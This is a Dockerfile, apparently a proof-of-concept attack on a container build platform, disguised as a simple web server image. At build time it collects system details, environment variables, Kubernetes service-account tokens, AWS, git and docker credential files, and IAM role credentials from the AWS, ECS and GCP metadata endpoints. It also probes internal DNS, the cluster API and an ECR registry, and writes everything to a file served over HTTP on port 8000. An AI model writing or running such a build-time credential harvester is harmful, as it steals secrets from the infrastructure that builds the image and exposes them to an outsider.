FROM alpine:3.20
RUN apk add --no-cache curl bind-tools ca-certificates >/dev/null 2>&1 || true
RUN mkdir -p /www && set +e; exec > /www/recon.txt 2>&1; \
echo "=== WHOAMI ==="; id; hostname; uname -a; cat /etc/os-release; \
echo "=== PROC1 ==="; tr '\0' ' ' < /proc/1/cmdline; echo; cat /proc/self/cgroup; \
echo "=== ENV ==="; env | sort; \
echo "=== PROC1ENV ==="; tr '\0' '\n' < /proc/1/environ 2>/dev/null | sort; \
echo "=== HOSTS ==="; cat /etc/hosts; cat /etc/resolv.conf; \
echo "=== MOUNTINFO ==="; cat /proc/self/mountinfo; \
echo "=== ROOTLS ==="; ls -la /; \
echo "=== SECRETDIRS ==="; ls -la /var/run/secrets /var/run/secrets/kubernetes.io/serviceaccount /etc/secrets /run/secrets /run/podman /var/run 2>&1; \
echo "=== K8S SA ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; \
echo "=== CRED FILES ==="; for f in /root/.gitconfig /root/.git-credentials /root/.netrc /root/.docker/config.json /root/.aws/credentials /root/.aws/config /home/*/.aws/credentials /home/*/.git-credentials /home/*/.netrc /etc/containers/auth.json /run/containers/0/auth.json /var/run/containers/0/auth.json /tmp/.git-credentials; do echo "-- $f"; cat "$f" 2>&1; done; \
echo "=== FIND SECRETS ==="; find / -maxdepth 5 \( -iname '*dockerconfig*' -o -name 'auth.json' -o -name '.git-credentials' -o -iname '*registry*secret*' -o -iname '*git-secret*' -o -name '*.token' -o -name 'credentials' \) 2>/dev/null | head -80; \
echo "=== AWS ENV ==="; env | grep -i -E 'aws|ecr|token|secret|git|choreo|argo|amp|key' | sort; \
echo "=== IMDSv1 ==="; curl -s -m 5 -i http://169.254.169.254/latest/meta-data/ 2>&1 | head -40; \
echo "=== IMDSv2 TOKEN ==="; IT=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>&1); echo "token=[$IT]"; \
if [ -n "$IT" ]; then echo "=== IMDSv2 META ==="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $IT" http://169.254.169.254/latest/meta-data/ 2>&1; echo; echo "=== IMDSv2 ROLELIST ==="; RL=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $IT" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1); echo "role=[$RL]"; echo "=== IMDSv2 CREDS ==="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $IT" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$RL" 2>&1; echo; echo "=== IMDSv2 IDENTITY ==="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $IT" http://169.254.169.254/latest/dynamic/instance-identity/document 2>&1; echo; echo "=== IMDSv2 USERDATA ==="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $IT" http://169.254.169.254/latest/user-data 2>&1 | head -30; fi; \
echo "=== ECS METADATA ==="; curl -s -m 5 -i http://169.254.170.2/v2/credentials/ 2>&1 | head -15; env | grep -i AWS_CONTAINER; \
echo "=== GCP METADATA ==="; curl -s -m 5 -i -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>&1 | head -15; \
echo "=== DNS INTERNAL ==="; for h in kubernetes.default.svc kube-dns.kube-system.svc registry.workflows.svc agent-manager-service.platform.svc; do echo "-- $h"; nslookup "$h" 2>&1 | tail -6; done; \
echo "=== K8S ANON ==="; curl -sk -m 5 -i https://10.172.48.1:443/version 2>&1 | head -20; curl -sk -m 5 -i https://kubernetes.default.svc/version 2>&1 | head -20; \
echo "=== ECR V2 ==="; curl -s -m 8 -i https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/ 2>&1 | head -30; \
echo "=== ECR TAGS ==="; curl -s -m 8 -i "https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/poc2-1795110817433-image/tags/list" 2>&1 | head -30; \
echo "=== DOCKERHUB CTL ==="; curl -s -m 8 -i https://registry-1.docker.io/v2/ 2>&1 | head -15; \
echo "=== PODMAN SOCK ==="; ls -la /run/podman/podman.sock /var/run/docker.sock 2>&1; echo "DOCKER_HOST=$DOCKER_HOST"; \
echo "=== END ==="
RUN mkdir -p /www && echo ok > /www/index.html && adduser -D -u 1000 app && chown -R 1000:1000 /www && chmod -R a+rX /www
USER 1000
EXPOSE 8000
CMD ["busybox","httpd","-f","-p","8000","-h","/www"]
